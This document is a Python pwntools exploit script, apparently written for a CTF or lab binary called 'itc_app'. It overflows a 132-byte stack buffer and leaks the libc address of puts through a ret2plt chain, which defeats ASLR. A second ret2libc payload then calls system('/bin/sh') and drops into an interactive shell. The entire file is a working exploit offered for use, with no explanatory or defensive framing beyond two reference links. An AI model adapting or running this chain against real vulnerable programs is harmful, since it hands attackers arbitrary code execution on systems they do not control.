import struct
from pwn import process, ELF, context

BUFFER = 132
PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac

def main():

    # Set the binary context
    binary_path = './itc_app'

    # Start the process
    proc = process()

    # Construct the initial payload
    payload = (
        b'A' * BUFFER +
        struct.pack("I", PUTS_PLT_ADDRESS) +  # puts PLT
        struct.pack("I", MAIN_ADDRESS) +      # main address
        struct.pack("I", PUTS_GOT_ADDRESS)    # puts GOT
    )

    # Send the initial payload
    proc.sendline(payload)

    WELCOME_DETECTED, LEAKED_ADDRESS = False, None

    # Process output to leak address
    for _ in range(10):
        try:
            line = proc.recvline()
            print(line)  # Display the line received from the process
            if WELCOME_DETECTED and b"Welcome" in line:
                LEAKED_ADDRESS = int.from_bytes(previous_line[:4], byteorder='little')
                print(f"\033[32mLeaked puts' libc Addr: \033[0m\033[36m{hex(LEAKED_ADDRESS)}\033[0m")
                libc_base_address = LEAKED_ADDRESS - 0x731b0  # Offset for libc's puts
                print(f"\033[32mLibc base Addr: \033[0m\033[36m{hex(libc_base_address)}\033[0m")
                break
            if b"Welcome" in line:
                WELCOME_DETECTED = True
            previous_line = line
        except EOFError:
            break

    # Construct and send the final payload if an address was leaked
    if LEAKED_ADDRESS:
        final_payload = (
            b'A' * BUFFER +
            struct.pack("I", libc_base_address + 0x4c830) +  # libc system offset
            struct.pack("I", libc_base_address + 0x3c130) +  # libc exit offset
            struct.pack("I", libc_base_address + 0x1b5fc8)   # libc /bin/sh offset
        )
    
        proc.sendline(final_payload)

        # Interact with the process after sending the final payload
        proc.interactive()


if __name__ == "__main__":
    main()

"""
References:
- https://docs.pwntools.com/en/stable/
- https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
"""
